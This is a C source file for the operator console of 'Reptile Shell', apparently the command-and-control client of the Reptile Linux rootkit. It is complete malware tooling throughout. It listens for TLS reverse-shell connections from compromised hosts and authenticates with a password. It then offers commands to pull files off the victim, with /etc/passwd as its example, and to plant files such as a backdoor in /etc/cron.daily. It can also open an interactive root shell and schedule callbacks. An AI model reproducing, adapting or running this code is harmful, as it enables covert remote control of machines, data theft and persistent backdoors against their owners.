#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>
#include <readline/readline.h>
#include <readline/history.h>

#include "config.h"
#include "pel.h"
#include "util.h"

/* TODO(CMK): better option than simple compile-time paths? */
#ifndef CERT_FILENAME
#warning CERT_FILENAME must be defined as the path to the certificate pem
#define CERT_FILENAME "/usr/my_certs/server-certificate.pem"
#endif

#ifndef PRIV_KEY_FILENAME
#warning PRIV_KEY_FILENAME must be defined as the path to the private key pem
#define PRIV_KEY_FILENAME "/usr/my_certs/server-private-key.pem"
#endif

extern char *optarg;
unsigned char message[BUFSIZE + 1];
char *password = NULL;
pid_t pid;

static openssl_ctx *m_openssl_server;

int help(openssl_ctx *ctx, char **args);
int __exit(openssl_ctx *ctx, char **args);
int shell(openssl_ctx *ctx, char **args);
int get_file(openssl_ctx *ctx, char **args);
int put_file(openssl_ctx *ctx, char **args);
int delay(openssl_ctx *ctx, char **args);

char *builtin_str[] = {"help", "download", "upload", "shell", "delay", "exit"};
int (*builtin_func[])(openssl_ctx *ctx, char **) = {&help,  &get_file, &put_file,
					    &shell, &delay,    &__exit};

int num_builtins() { return sizeof(builtin_str) / sizeof(char *); }

void pel_error(char *s)
{
	switch (pel_errno) {
	case PEL_CONN_CLOSED:
		fprintf(stderr, "%s %s: Connection closed.\n", bad, s);
		break;

	case PEL_SYSTEM_ERROR:
		p_error(s);
		break;

	case PEL_WRONG_CHALLENGE:
		fprintf(stderr, "%s %s: Wrong challenge.\n", bad, s);
		break;

	case PEL_BAD_MSG_LENGTH:
		fprintf(stderr, "%s %s: Bad message length.\n", bad, s);
		break;

	case PEL_CORRUPTED_DATA:
		fprintf(stderr, "%s %s: Corrupted data.\n", bad, s);
		break;

	case PEL_UNDEFINED_ERROR:
		fprintf(stderr, "%s %s: No error.\n", bad, s);
		break;

	case PEL_OPENSSL_ERROR:
		fprintf(stderr, "%s", bad);
		openssl_print_errors(s);
		break;

	default:
		fprintf(stderr, "%s %s: Unknown error code.\n", bad, s);
		break;
	}
}

void help_download()
{
	fprintf(stdout, "%s <file path> <dest dir>\n", builtin_str[1]);
	fprintf(stdout, "Example: download /etc/passwd /tmp\n");
}

void help_upload()
{
	fprintf(stdout, "%s <file path> <dest dir>\n", builtin_str[2]);
	fprintf(stdout, "Example: upload /root/backdoor /etc/cron.daily\n");
}

void help_delay()
{
	fprintf(stdout, "%s <seconds>\n", builtin_str[4]);
	fprintf(stdout, "Example: delay 3600\n\n");
	fprintf(stdout, "%s Use \"delay 0\" if you don't wanna a "
			"connecion every X time\n", warn);
}

void no_help()
{
	fprintf(stdout, "This command doesn't need help\n");
}

int help(openssl_ctx *ctx, char **args)
{
	if (args[0] == NULL && ctx == NULL)
		return 1;

	if (args[1] != NULL) {
		if (strcmp(args[1], builtin_str[0]) == 0) {
			no_help();
		} else if (strcmp(args[1], builtin_str[1]) == 0) {
			help_download();
		} else if (strcmp(args[1], builtin_str[2]) == 0) {
			help_upload();
		} else if (strcmp(args[1], builtin_str[3]) == 0) {
			no_help();
		} else if (strcmp(args[1], builtin_str[4]) == 0) {
			help_delay();
		} else if (strcmp(args[1], builtin_str[5]) == 0) {
			no_help();
		} else {
			fprintf(stdout, "This command is not valid!\n");
		}
	} else {
		fprintf(stdout, "\n\e[01;36mReptile Shell\e[00m\n");
		fprintf(stdout, "\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");
		fprintf(stdout, "\t%s\t\tShow this help\n", builtin_str[0]);
		fprintf(stdout, "\t%s\tDownload a file from host\n", builtin_str[1]);
		fprintf(stdout, "\t%s\t\tUpload a file to host\n", builtin_str[2]);
		fprintf(stdout, "\t%s\t\tOpen a full TTY interactive shell\n", builtin_str[3]);
		fprintf(stdout, "\t%s\t\tSet time to reverse shell connect\n", builtin_str[4]);
		fprintf(stdout, "\t%s\t\tExit this shell\n\n", builtin_str[5]);
		fprintf(stdout, "Type: \"help <command>\" to see specific help\n");
	}

	fprintf(stdout, "\n");
	return 1;
}

int __exit(openssl_ctx *ctx, char **args)
{
	if (args[0] == NULL && ctx == NULL)
		return 1;

	pel_send_msg(ctx, (unsigned char *)EXIT, EXIT_LEN);
	
	if (m_openssl_server) {
		openssl_ctx_delete(m_openssl_server);
		m_openssl_server = NULL;
	}

	fprintf(stdout, "\n");
	return 0;
}

int shell(openssl_ctx *ctx, char **args)
{
	fd_set rd;
	char *term, *temp;
	int ret, len, imf, i, size;
	struct winsize ws;
	struct termios tp, tr;

	if (args[0] == NULL && ctx == NULL)
		return 1;

	term = getenv("TERM");

	if (term == NULL)
		term = "vt100";

	len = strlen(term);

	ret = pel_send_msg(ctx, (unsigned char *)term, len);

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	imf = 0;

	if (isatty(0)) {
		imf = 1;

		if (ioctl(0, TIOCGWINSZ, &ws) < 0) {
			p_error("ioctl(TIOCGWINSZ)");
			return 1;
		}
	} else {
		ws.ws_row = 25;
		ws.ws_col = 80;
	}

	message[0] = (ws.ws_row >> 8) & 0xFF;
	message[1] = (ws.ws_row) & 0xFF;
	message[2] = (ws.ws_col >> 8) & 0xFF;
	message[3] = (ws.ws_col) & 0xFF;

	ret = pel_send_msg(ctx, message, 4);

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	if (strcmp(args[0], builtin_str[3]) == 0) {
		temp = (char *)malloc(2);

		if (!temp) {
			p_error("malloc");
			return 1;
		}

		temp[0] = RUNSHELL;
		temp[1] = '\0';
		fprintf(stdout, "\n");
	} else {
		size = 1;
		len = 0;

		temp = (char *)malloc(size);

		if (!temp) {
			p_error("malloc");
			return 1;
		}

		while (args[len] != NULL) {
			size++;
			size += strlen(args[len]);
			char *temp_backup = temp;
			if ((temp = realloc(temp, size)) == NULL) {
				free(temp_backup);
				p_error("realloc");
				return 1;
			}
			len++;
		}

		memset(temp, '\0', size);

		for (i = 0; i < len; i++) {
			strcat(temp, args[i]);
			strcat(temp, " ");
		}
	}

	len = strlen(temp);
	ret = pel_send_msg(ctx, (unsigned char *)temp, len);
	free(temp);

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	if (isatty(1)) {
		if (tcgetattr(1, &tp) < 0) {
			p_error("tcgetattr");
			return 1;
		}

		memcpy((void *)&tr, (void *)&tp, sizeof(tr));

		tr.c_iflag |= IGNPAR;
		tr.c_iflag &=
		    ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
		tr.c_lflag &=
		    ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL | IEXTEN);
		tr.c_oflag &= ~OPOST;

		tr.c_cc[VMIN] = 1;
		tr.c_cc[VTIME] = 0;

		if (tcsetattr(1, TCSADRAIN, &tr) < 0) {
			p_error("tcsetattr");
			return 1;
		}
	}

	int conn_fd = openssl_get_fd(ctx);

	while (1) {
		FD_ZERO(&rd);

		if (imf != 0)
			FD_SET(0, &rd);

		FD_SET(conn_fd, &rd);

		if (select(conn_fd + 1, &rd, NULL, NULL, NULL) < 0) {
			p_error("select");
			break;
		}

		if (FD_ISSET(conn_fd, &rd)) {
			ret = pel_recv_msg(ctx, message, &len);

			if (ret != PEL_SUCCESS) {
				pel_error("pel_recv_msg");
				break;
			}

			if (strncmp((char *)message, EXIT, EXIT_LEN) == 0) {
				if (isatty(1))
					tcsetattr(1, TCSADRAIN, &tp);

				fprintf(stdout, "\n");
				return 1;
			}

			if (write(1, message, len) != len) {
				p_error("write");
				break;
			}
		}

		if (imf != 0 && FD_ISSET(0, &rd)) {
			if ((len = read(0, message, BUFSIZE)) < 0) {
				p_error("read");
				break;
			}

			if (len == 0) {
				fprintf(stderr, "stdin: end-of-file\n");
				break;
			}

			ret = pel_send_msg(ctx, message, len);

			if (ret != PEL_SUCCESS) {
				pel_error("pel_send_msg");
				break;
			}
		}
	}

	if (isatty(1))
		tcsetattr(1, TCSADRAIN, &tp);

	return 1;
}

int get_file(openssl_ctx *ctx, char **args)
{
	char *temp, *pathname;
	int ret, len, fd, total;
	unsigned char out = OUT;

	if (args[1] == NULL || args[2] == NULL) {
		fprintf(stderr, "%s wrong arguments\n\n", bad);

		if (pel_send_msg(ctx, &out, 1) != PEL_SUCCESS)
			pel_error("pel_send_msg");

		return 1;
	}

	len = strlen(args[1]);

	ret = pel_send_msg(ctx, (unsigned char *)args[1], len);

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	temp = strrchr(args[1], '/');

	if (temp != NULL)
		temp++;
	if (temp == NULL)
		temp = args[1];

	len = strlen(args[2]);

	pathname = (char *)malloc(len + strlen(temp) + 2);

	if (pathname == NULL) {
		p_error("malloc");
		return 1;
	}

	strcpy(pathname, args[2]);
	strcpy(pathname + len, "/");
	strcpy(pathname + len + 1, temp);

	fd = creat(pathname, 0644);

	if (fd < 0) {
		p_error("creat");
		free(pathname);
		return 1;
	}

	free(pathname);

	total = 0;

	while (1) {
		ret = pel_recv_msg(ctx, message, &len);

		if (ret != PEL_SUCCESS) {
			pel_error("pel_recv_msg");
			fprintf(stderr, "%s Transfer failed.\n", bad);
			return 1;
		}

		if (strncmp((char *)message, EXIT, EXIT_LEN) == 0 && total > 0)
			break;

		if (write(fd, message, len) != len) {
			p_error("write");
			return 1;
		}

		total += len;

		fprintf(stdout, "%d\r", total);
		fflush(stdout);
	}

	fprintf(stdout, "%s %d done.\n\n", good, total);

	return 1;
}

int put_file(openssl_ctx *ctx, char **args)
{
	char *temp, *pathname;
	int ret, len, fd, total;
	unsigned char out = OUT;

	if (args[1] == NULL || args[2] == NULL) {
		fprintf(stderr, "%s wrong arguments\n\n", bad);

		if (pel_send_msg(ctx, &out, 1) != PEL_SUCCESS)
			pel_error("pel_send_msg");

		return 1;
	}

	temp = strrchr(args[1], '/');

	if (temp != NULL)
		temp++;
	if (temp == NULL)
		temp = args[1];

	len = strlen(args[2]);

	pathname = (char *)malloc(len + strlen(temp) + 2);

	if (pathname == NULL) {
		p_error("malloc");
		return 1;
	}

	strcpy(pathname, args[2]);
	strcpy(pathname + len, "/");
	strcpy(pathname + len + 1, temp);

	len = strlen(pathname);

	ret = pel_send_msg(ctx, (unsigned char *)pathname, len);

	free(pathname);

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	fd = open(args[1], O_RDONLY);

	if (fd < 0) {
		p_error("open");
		return 1;
	}

	total = 0;

	while (1) {
		len = read(fd, message, BUFSIZE);

		if (len < 0) {
			p_error("read");
			return 1;
		}

		if (len == 0) {
			break;
		}

		ret = pel_send_msg(ctx, message, len);

		if (ret != PEL_SUCCESS) {
			pel_error("pel_send_msg");
			fprintf(stderr, "%s Transfer failed.\n", bad);
			return 1;
		}

		total += len;

		printf("%s %d\r", good, total);
		fflush(stdout);
	}

	pel_send_msg(ctx, (unsigned char *)EXIT, EXIT_LEN);

	printf("%s %d done.\n\n", good, total);
	return 1;
}

int delay(openssl_ctx *ctx, char **args)
{
	int ret, flag;
	unsigned int i, j;
	char *numbers = "0123456789";
	unsigned char out = OUT;

	if (args[1] == NULL) {
		fprintf(stderr, "%s no arguments\n\n", bad);

		if (pel_send_msg(ctx, &out, 1) != PEL_SUCCESS)
			pel_error("pel_send_msg");

		return 1;
	}

	for (i = 0; i < strlen(args[1]); i++) {
		flag = 0;

		for (j = 0; j < strlen(numbers); j++) {
			if (args[1][i] == numbers[j])
				flag = 1;
		}

		if (flag == 0) {
			fprintf(stderr, "%s wrong argument\n\n", bad);

			if (pel_send_msg(ctx, &out, 1) != PEL_SUCCESS)
				pel_error("pel_send_msg");

			return 1;
		}
	}

	ret = pel_send_msg(ctx, (unsigned char *)args[1], strlen(args[1]));

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	fprintf(stdout, "%s delay -> %s\n\n", good, args[1]);
	return 1;
}

int execute(openssl_ctx *ctx, char **args)
{
	int i, ret;

	if (args[0] == NULL || ctx == NULL)
		return 1;

	for (i = 0; i < num_builtins(); i++) {
		if (strcmp(args[0], builtin_str[i]) == 0) {
			if (i == 0) {
				return (*builtin_func[i])(ctx, args);
			} else {
				ret =
				    pel_send_msg(ctx, (unsigned char *)&i, 1);

				if (ret != PEL_SUCCESS) {
					pel_error("pel_send_msg");
					return 1;
				}

				return (*builtin_func[i])(ctx, args);
			}
		}
	}

	i = 3;
	ret = pel_send_msg(ctx, (unsigned char *)&i, 1);

	if (ret != PEL_SUCCESS) {
		pel_error("pel_send_msg");
		return 1;
	}

	return (*builtin_func[3])(ctx, args);
}

char *read_line(void)
{
	int bufsize = RL_BUFSIZE;
	int position = 0;
	char *buffer = malloc(sizeof(char) * bufsize);
	int c;

	if (!buffer) {
		fprintf(stderr, "reptile: allocation error\n");
		exit(EXIT_FAILURE);
	}

	while (1) {
		c = getchar();

		if (c == EOF) {
			free(buffer);
			exit(EXIT_SUCCESS);
		} else if (c == '\n') {
			buffer[position] = '\0';
			return buffer;
		} else {
			buffer[position] = c;
		}
		position++;

		if (position >= bufsize) {
			bufsize += RL_BUFSIZE;
			char *buffer_backup = buffer;
			if ((buffer = realloc(buffer, bufsize)) == NULL) {
				free(buffer_backup);
				fprintf(stderr, "reptile: allocation error\n");
				exit(EXIT_FAILURE);
			}
		}
	}
}

char **parse(char *line)
{
	int bufsize = TOK_BUFSIZE, position = 0;
	char **tokens = malloc(bufsize * sizeof(char *));
	char *token, **tokens_backup;

	if (!tokens) {
		fprintf(stderr, "reptile: allocation error\n");
		exit(EXIT_FAILURE);
	}

	token = strtok(line, TOK_DELIM);
	while (token != NULL) {
		tokens[position] = token;
		position++;

		if (position >= bufsize) {
			bufsize += TOK_BUFSIZE;
			tokens_backup = tokens;
			tokens = realloc(tokens, bufsize * sizeof(char *));
			if (!tokens) {
				free(tokens_backup);
				fprintf(stderr, "reptile: allocation error\n");
				exit(EXIT_FAILURE);
			}
		}

		token = strtok(NULL, TOK_DELIM);
	}
	tokens[position] = NULL;
	return tokens;
}

void reptile_loop(openssl_ctx *ctx)
{
	char *line;
	char **args;
	int status;

	do {
		line = readline("\e[01;32mreptile> \e[00m");
		add_history(line);

		args = parse(line);
		status = execute(ctx, args);

		free(line);
		free(args);
	} while (status);

	clear_history();
}

void handle_shutdown(int signal)
{
	if (m_openssl_server) {
		openssl_ctx_delete(m_openssl_server);
		m_openssl_server = NULL;
	}

	exit(signal);
}

void listener(int port)
{
	struct sockaddr_in host_addr;
	
	/* Step 1: create the OpenSSL context and initialize a TLS server. */
	m_openssl_server = openssl_ctx_new();
	if (!m_openssl_server) {
		kill(pid, SIGQUIT);
		fatal("openssl_ctx_new");
	}

	printf("%s Using certificate and private key files:\n\t%s\n\t%s\n", 
		good, CERT_FILENAME, PRIV_KEY_FILENAME);

	if (!openssl_server_init(m_openssl_server, port, CERT_FILENAME, PRIV_KEY_FILENAME)) {
		kill(pid, SIGQUIT);
		openssl_ctx_delete(m_openssl_server);
		m_openssl_server = NULL;
		fatal("openssl_server_init");
	}

	printf("%s Listening on port %d\n", good, port);

	/* Step 2: accept the incoming connection. */
	if (!openssl_server_accept(m_openssl_server)) {
		kill(pid, SIGQUIT);
		openssl_ctx_delete(m_openssl_server);
		m_openssl_server = NULL;
		fatal("openssl_server_accept");
	}

	printf("%s Connection from %s:%s\n\n", awesome,
		openssl_get_peer_name(m_openssl_server), 
		openssl_get_peer_port(m_openssl_server));

	// usleep(100 * 1500);

	if (password == NULL) {
		password = getpass("Password: ");
		fprintf(stdout, "\n");
	}

	if (pel_client_init(m_openssl_server, password) != PEL_SUCCESS) {
		openssl_ctx_delete(m_openssl_server);
		fprintf(stdout, "%s wrong password!\n\n", bad);
		exit(ERROR);
	}

	banner();
	reptile_loop(m_openssl_server);

	printf("%s reptile loop finished\n", good);

	openssl_ctx_delete(m_openssl_server);
}

void usage(char *argv0)
{
	fprintf(stderr, "Usage: %s [ -p port ] [ -s secret ]\n",
		argv0);
	exit(1);
}

int main(int argc, char **argv)
{
	int opt, port = 0;

	while ((opt = getopt(argc, argv, "p:s:")) != EOF) {
		switch (opt) {
		case 'p':
			port = atoi(optarg);
			break;
		case 's':
			password = optarg;
			break;
		default:
			usage(argv[0]);
			break;
		}
	}

	if (port == 0)
		usage(*argv);

	if (argc <= 1)
		usage(argv[0]);

	// printf("\n\e[01;36mReptile Shell\e[00m\n");
	// printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");

	if (password != NULL)
		fprintf(stdout, "%s Using password: %s\n", good, password);

	pid = fork();

	if (pid == -1)
		fatal("on forking proccess");

	if (pid > 0)
		listener(port);

	// if (pid == 0)
	// background job while we are listening

	return EXIT_SUCCESS;
}
